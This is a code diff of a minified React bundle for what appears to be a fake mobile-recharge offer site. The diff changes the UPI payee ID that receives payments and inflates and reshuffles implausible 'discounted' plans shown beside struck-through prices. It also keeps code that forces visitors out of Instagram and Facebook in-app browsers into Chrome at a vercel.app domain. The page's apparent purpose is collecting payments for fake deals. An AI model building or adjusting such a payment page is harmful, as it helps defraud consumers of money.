@@ -10281,7 +10281,7 @@
                 const n = [{
                     supportedMethods: ["https://tez.google.com/pay"],
                     data: {
-                        pa: "mab.037324037320218@axisbank",
+                        pa: "mab.037324034880063@axisbank",
                         pn: "Mobile Recharge",
                         url: "https://yourwebsite.com/order/1234ABCD",
                         mc: "1234",
@@ -10417,7 +10417,7 @@
                             }), (0,
                             We.jsx)("div", {
                                 className: "ml-4 line-through text-slate-600",
-                                children: "\u20b92499"
+                                children: "\u20b91299"
                             })]
                         }), (0,
                         We.jsx)("div", {
@@ -10504,7 +10504,7 @@
                                 className: "flex items-center text-[20px] font-bold text-slate-800",
                                 children: [(0,
                                 We.jsx)("div", {
-                                    children: "\u20b9149"
+                                    children: "\u20b9299"
                                 }), (0,
                                 We.jsx)("div", {
                                     className: "ml-4 line-through text-slate-600",
@@ -10531,7 +10531,7 @@
                                 }), (0,
                                 We.jsx)("div", {
                                     className: "text-slate-800 text-[13px] font-bold",
-                                    children: "84 days"
+                                    children: "12 month"
                                 })]
                             }), (0,
                             We.jsxs)("div", {
@@ -10575,7 +10575,7 @@
                             className: "mt-5",
                             children: (0,
                             We.jsx)("button", {
-                                onClick: () => o(149),
+                                onClick: () => o(299),
                                 className: "bg-blue-500 py-2 w-full text-[13px] rounded-full font-bold text-white",
                                 children: "Recharge"
                             })
@@ -10596,11 +10596,11 @@
                                 className: "flex items-center text-[20px] font-bold text-slate-800",
                                 children: [(0,
                                 We.jsx)("div", {
-                                    children: "\u20b9199"
+                                    children: "\u20b9499"
                                 }), (0,
                                 We.jsx)("div", {
                                     className: "ml-4 line-through text-slate-600",
-                                    children: "\u20b9999"
+                                    children: "\u20b92499"
                                 })]
                             }), (0,
                             We.jsx)("div", {
@@ -10623,7 +10623,7 @@
                                 }), (0,
                                 We.jsx)("div", {
                                     className: "text-slate-800 text-[13px] font-bold",
-                                    children: "84 days"
+                                    children: "12 month"
                                 })]
                             }), (0,
                             We.jsxs)("div", {
@@ -10635,7 +10635,7 @@
                                 }), (0,
                                 We.jsx)("div", {
                                     className: "text-slate-800 text-[13px] font-bold",
-                                    children: "2.0 GB/day"
+                                    children: "3.0 GB/day"
                                 })]
                             }), (0,
                             We.jsxs)("div", {
@@ -10667,194 +10667,12 @@
                             className: "mt-5",
                             children: (0,
                             We.jsx)("button", {
-                                onClick: () => o(199),
+                                onClick: () => o(499),
                                 className: "bg-blue-500 py-2 w-full text-[13px] rounded-full font-bold text-white",
                                 children: "Recharge"
                             })
                         })]
-                    }), (0,
-                We.jsxs)("div", {
-                    className: "bg-white rounded-xl p-4 my-4 shadow-xl shadow-blue-100",
-                    children: [(0,
-                    We.jsx)("div", {
-                        className: "bg-rose-600 py-1 px-3 rounded text-white text-[10px] font-bold w-fit",
-                        children: "Exclusive"
-                    }), (0,
-                    We.jsxs)("div", {
-                        className: "flex items-center justify-between my-2",
-                        children: [(0,
-                        We.jsxs)("div", {
-                            className: "flex items-center text-[20px] font-bold text-slate-800",
-                            children: [(0,
-                            We.jsx)("div", {
-                                children: "\u20b9249"
-                            }), (0,
-                            We.jsx)("div", {
-                                className: "ml-4 line-through text-slate-600",
-                                children: "\u20b91299"
-                            })]
-                        }), (0,
-                        We.jsx)("div", {
-                            children: (0,
-                            We.jsx)("img", {
-                                src: Ze,
-                                alt: ""
-                            })
-                        })]
-                    }), (0,
-                    We.jsxs)("div", {
-                        className: "flex items-center justify-between mt-3",
-                        children: [(0,
-                        We.jsxs)("div", {
-                            className: "",
-                            children: [(0,
-                            We.jsx)("div", {
-                                className: "text-slate-600 text-[13px]",
-                                children: "VALIDITY"
-                            }), (0,
-                            We.jsx)("div", {
-                                className: "text-slate-800 text-[13px] font-bold",
-                                children: "84 days"
-                            })]
-                        }), (0,
-                        We.jsxs)("div", {
-                            className: "",
-                            children: [(0,
-                            We.jsx)("div", {
-                                className: "text-slate-600 text-[13px]",
-                                children: "DATA"
-                            }), (0,
-                            We.jsx)("div", {
-                                className: "text-slate-800 text-[13px] font-bold",
-                                children: "3.0 GB/day"
-                            })]
-                        }), (0,
-                        We.jsxs)("div", {
-                            className: "",
-                            children: [(0,
-                            We.jsx)("div", {
-                                className: "text-slate-600 text-[13px]",
-                                children: "Voice"
-                            }), (0,
-                            We.jsx)("div", {
-                                className: "text-slate-800 text-[13px] font-bold",
-                                children: "Unlimited"
-                            })]
-                        }), (0,
-                        We.jsxs)("div", {
-                            className: "",
-                            children: [(0,
-                            We.jsx)("div", {
-                                className: "text-slate-600 text-[13px]",
-                                children: "SMS"
-                            }), (0,
-                            We.jsx)("div", {
-                                className: "text-slate-800 text-[13px] font-bold",
-                                children: "100/day"
-                            })]
-                        })]
-                    }), (0,
-                    We.jsx)("div", {
-                        className: "mt-5",
-                        children: (0,
-                        We.jsx)("button", {
-                            onClick: () => o(249),
-                            className: "bg-blue-500 py-2 w-full text-[13px] rounded-full font-bold text-white",
-                            children: "Recharge"
-                        })
-                    })]
-                }), (0,
-                We.jsxs)("div", {
-                    className: "bg-white rounded-xl p-4 my-4 shadow-xl shadow-blue-100",
-                    children: [(0,
-                    We.jsx)("div", {
-                        className: "bg-rose-600 py-1 px-3 rounded text-white text-[10px] font-bold w-fit",
-                        children: "Exclusive"
-                    }), (0,
-                    We.jsxs)("div", {
-                        className: "flex items-center justify-between my-2",
-                        children: [(0,
-                        We.jsxs)("div", {
-                            className: "flex items-center text-[20px] font-bold text-slate-800",
-                            children: [(0,
-                            We.jsx)("div", {
-                                children: "\u20b9279"
-                            }), (0,
-                            We.jsx)("div", {
-                                className: "ml-4 line-through text-slate-600",
-                                children: "\u20b91999"
-                            })]
-                        }), (0,
-                        We.jsx)("div", {
-                            children: (0,
-                            We.jsx)("img", {
-                                src: Ze,
-                                alt: ""
-                            })
-                        })]
-                    }), (0,
-                    We.jsxs)("div", {
-                        className: "flex items-center justify-between mt-3",
-                        children: [(0,
-                        We.jsxs)("div", {
-                            className: "",
-                            children: [(0,
-                            We.jsx)("div", {
-                                className: "text-slate-600 text-[13px]",
-                                children: "VALIDITY"
-                            }), (0,
-                            We.jsx)("div", {
-                                className: "text-slate-800 text-[13px] font-bold",
-                                children: "6 month"
-                            })]
-                        }), (0,
-                        We.jsxs)("div", {
-                            className: "",
-                            children: [(0,
-                            We.jsx)("div", {
-                                className: "text-slate-600 text-[13px]",
-                                children: "DATA"
-                            }), (0,
-                            We.jsx)("div", {
-                                className: "text-slate-800 text-[13px] font-bold",
-                                children: "2.0 GB/day"
-                            })]
-                        }), (0,
-                        We.jsxs)("div", {
-                            className: "",
-                            children: [(0,
-                            We.jsx)("div", {
-                                className: "text-slate-600 text-[13px]",
-                                children: "Voice"
-                            }), (0,
-                            We.jsx)("div", {
-                                className: "text-slate-800 text-[13px] font-bold",
-                                children: "Unlimited"
-                            })]
-                        }), (0,
-                        We.jsxs)("div", {
-                            className: "",
-                            children: [(0,
-                            We.jsx)("div", {
-                                className: "text-slate-600 text-[13px]",
-                                children: "SMS"
-                            }), (0,
-                            We.jsx)("div", {
-                                className: "text-slate-800 text-[13px] font-bold",
-                                children: "100/day"
-                            })]
-                        })]
-                    }), (0,
-                    We.jsx)("div", {
-                        className: "mt-5",
-                        children: (0,
-                        We.jsx)("button", {
-                            onClick: () => o(279),
-                            className: "bg-blue-500 py-2 w-full text-[13px] rounded-full font-bold text-white",
-                            children: "Recharge"
-                        })
-                    })]
-                }), (0,
+                    }),  (0,
             We.jsx)("div", {}), (0,
             We.jsx)("img", {
                 src: Xe,
@@ -11033,7 +10851,7 @@
                 var e = navigator.userAgent || navigator.vendor || window.opera;
                 return e.indexOf("Instagram") > -1 || e.indexOf("FBAN") > -1 || e.indexOf("FBAV") > -1
             }() ? t(!0) : (t(!1),
-            /android/i.test(navigator.userAgent) ? window.location.href = "intent://getoffer.vercel.app/#Intent;scheme=https;package=com.android.chrome;end;" : /iPhone|iPad|iPod/i.test(navigator.userAgent) ? alert("To complete your payment, please open this link in Safari or Chrome.") : window.location.href = "https://getoffer.vercel.app/")
+            /android/i.test(navigator.userAgent) ? window.location.href = "intent://getoffer.vercel.app/#Intent;scheme=https;package=com.android.chrome;end;" : /iPhone|iPad|iPod/i.test(navigator.userAgent) ? alert("To complete your payment, please open this link in Safari or Chrome.") : window.location.href = "https://getoffer.vercel.app//")
         }
         ), []),
         (0,
